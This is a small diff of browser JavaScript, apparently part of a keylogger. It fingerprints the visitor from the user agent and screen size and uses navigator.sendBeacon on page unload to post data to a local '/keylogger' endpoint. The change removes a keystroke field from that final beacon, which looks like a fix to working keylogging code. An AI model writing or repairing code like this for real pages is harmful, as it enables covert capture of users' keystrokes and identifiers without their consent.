@@ -11,7 +11,6 @@ const id = btoa(navigator.userAgent + screen.width + screen.height).slice(0, 12)
   window.addEventListener('beforeunload', function() {
       navigator.sendBeacon('http://127.0.0.1:7777/keylogger', JSON.stringify({
         done: true,
-        id: id,
-        key: e.key
+        id: id
       }));
   });
